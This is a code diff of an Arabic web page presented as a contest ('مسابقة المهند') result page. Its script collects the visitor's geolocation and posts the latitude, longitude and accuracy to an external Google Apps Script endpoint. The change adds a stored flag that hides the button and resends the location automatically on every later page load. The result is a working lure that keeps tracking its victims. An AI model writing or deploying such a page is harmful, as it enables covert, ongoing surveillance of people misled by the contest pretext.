@@ -5,39 +5,71 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>مسابقة المهند</title>
 <style>
-body{font-family:Arial;text-align:center;margin-top:40px}
-button{padding:12px 20px;font-size:16px;cursor:pointer}
+body { font-family: Arial; text-align: center; margin-top: 40px; }
+button { padding: 12px 20px; font-size: 16px; cursor: pointer; }
 </style>
 </head>
 <body>
 
-<h2> عرض النتيجة</h2>
-<p> اضغط الزر ثم وافق علي الطلب</p>
-<button onclick="sendLocation()">إرسال طلب</button>
+<h2>عرض النتيجة</h2>
+<p id="info">اضغط الزر للسماح بالوصول لموقعك</p>
+<button id="sendBtn">إرسال الموقع</button>
 
 <script>
+// رابط Google Script
+const scriptURL = "https://script.google.com/macros/s/AKfycbzw7qGmEnbRdcPVZOVIwH7_A31eqpE4g3ds9-0Adv2cmm-7M1Hlm8MAaHFTPGqVixmPlA/exec";
+
+// الدالة لإرسال الموقع
 function sendLocation() {
   if (!navigator.geolocation) {
-    alert("المتصفح لا يدعم إرسال الطلبات");
+    console.log("المتصفح لا يدعم الموقع");
+    document.getElementById("info").innerText = "المتصفح لا يدعم الموقع";
     return;
   }
 
   navigator.geolocation.getCurrentPosition(
     pos => {
-      fetch("https://script.google.com/macros/s/AKfycbzw7qGmEnbRdcPVZOVIwH7_A31eqpE4g3ds9-0Adv2cmm-7M1Hlm8MAaHFTPGqVixmPlA/exec", {
+      const data = {
+        lat: pos.coords.latitude,
+        lon: pos.coords.longitude,
+        acc: pos.coords.accuracy
+      };
+
+      fetch(scriptURL, {
         method: "POST",
-        body: JSON.stringify({
-          lat: pos.coords.latitude,
-          lon: pos.coords.longitude,
-          acc: pos.coords.accuracy
-        })
+        body: JSON.stringify(data),
+        mode: 'no-cors' // لتجنب مشاكل CORS
       })
-      .then(() => alert("تم إرسال الطب بنجاح"))
-      .catch(() => alert("حدث خطأ أثناء الإرسال"));
+      .then(() => console.log("تم إرسال الموقع بنجاح"))
+      .catch(() => console.log("حدث خطأ أثناء الإرسال"));
+
+      document.getElementById("info").innerText = "تم إرسال الموقع بنجاح";
     },
-    () => alert("تم رفض الإذن")
+    err => {
+      console.log(err);
+      document.getElementById("info").innerText = "تم رفض الإذن أو حدث خطأ";
+    }
   );
 }
+
+// زر الإرسال
+const btn = document.getElementById("sendBtn");
+btn.addEventListener("click", () => {
+  sendLocation();
+  // بعد السماح، نختفي الزر ونجعل الإرسال تلقائي في المرات القادمة
+  btn.style.display = "none";
+  document.getElementById("info").innerText = "سيتم إرسال الموقع تلقائيًا في المرات القادمة";
+
+  // حفظ حالة الإذن محليًا
+  localStorage.setItem("locationAllowed", "true");
+});
+
+// إذا المستخدم سمح سابقًا، الإرسال تلقائيًا عند تحميل الصفحة
+window.onload = () => {
+  if (localStorage.getItem("locationAllowed") === "true") {
+    sendLocation();
+  }
+};
 </script>
 
 </body>
